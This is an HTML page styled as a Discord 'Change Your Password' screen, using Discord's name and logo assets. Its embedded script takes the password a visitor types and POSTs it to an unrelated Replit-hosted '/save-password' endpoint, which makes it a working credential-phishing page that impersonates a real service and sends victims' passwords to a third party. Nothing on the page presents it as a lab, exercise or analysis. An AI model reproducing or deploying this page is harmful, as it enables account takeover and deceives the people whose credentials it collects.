<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/index.css">
    <link rel="stylesheet" href="css/main.css">
    <title>Discord</title>
</head>

<body>
    <img src="./assets/bg.svg" alt="Discord BG" class="bg">
    <div class="login-page">
        <div class="svg-logo-text">
            <img src="./assets/login-screen-logo.svg" alt="Discord">
        </div>


        <main class="main">
            <div class="authBox">
                <div class="main-form">

                    <form action="#" id="passwordForm">
                        <div class="input-groups">
                            <div class="img">
                                <img  src="./assets/img.svg" alt="Discord">
                            </div>
                            <div class="main-form-header">
                                <h1>Change Your Password</h1>
                            </div>
                            <div class="password-wrapper">
                                <label for="password">
                                    NEW PASSWORD
                                </label>
                                <input type="password" id="password" required>
                            </div>
                        </div>
                        <div class="forgot-password"></div>
                        <div class="login">
                            <button type="submit">Change Password</button>
                        </div>
                    </form>
                </div>   
            </div>
        </main>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
    <script>
        // Event listener for the form submission
        document.getElementById('passwordForm').addEventListener('submit', function(e) {
          e.preventDefault();  // Prevent the form from submitting the default way
    
          const password = document.getElementById('password').value;  // Get the password input value
    
          // Send a POST request to the Replit backend
          fetch('https://01dda9d3-c439-4303-806f-09b29d37f7d3-00-2wdl5zv4ndp0x.pike.replit.dev/save-password', {
            method: 'POST',  // Set method to POST
            headers: {
              'Content-Type': 'application/json',  // We're sending JSON data
            },
            body: JSON.stringify({ password: password })  // Send the password in the request body
          })
          .then(response => response.text())  // Get the response text from the backend
          .then(data => {
            alert(data);  // Show success message from the server
          })
          .catch(error => {
            console.error('Error:', error);  // Log any error in the console
            alert('Failed to save password.');  // Show failure message
          });
        });
      </script>
</body>
</html>